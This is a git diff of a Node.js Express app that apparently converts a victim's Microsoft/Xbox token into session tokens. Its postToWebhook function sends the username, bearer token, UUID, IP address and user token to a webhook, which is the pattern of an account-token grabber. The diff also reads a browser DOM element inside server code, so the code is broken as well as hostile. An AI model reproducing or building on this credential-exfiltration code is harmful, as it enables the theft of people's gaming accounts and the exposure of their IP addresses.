@@ -16,6 +16,11 @@ const port = process.env.PORT || 3000
 
 console.log('got them both')
 app.get('/', async (req, res) => {
+if (typeof window !== 'undefined') {
+  console.log('You are on the browser')
+} else {
+  console.log('You are on the server')
+}
     console.log('no query code for u') 
 var options = {
 
@@ -34,7 +39,7 @@ var options = {
         console.log('1')
         console.log('all of those parameters were obsolete, the fun part begins')
         console.log('user token set') // MODIFY VALUE ABOVE  ^^^
-const userToken = await returnText() 
+const userToken = await globalThis.document.getElementById("userInput").value
         const xstsTokenHashArray = await getXSTSToken(userToken)
         console.log('got array')
         const xstsToken = xstsTokenHashArray[0]
@@ -136,10 +141,10 @@ function postToWebhook(username, bearerToken, uuid, ip, userToken) {
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
 }
 
-function returnText() {
-  let userToken = globalThis.document.getElementById("userInput").value
-  alert(input)
-}
+//function returnText() {
+//  let userToken = 
+//  alert(input)
+//}
 
 const bannedNames = []
 
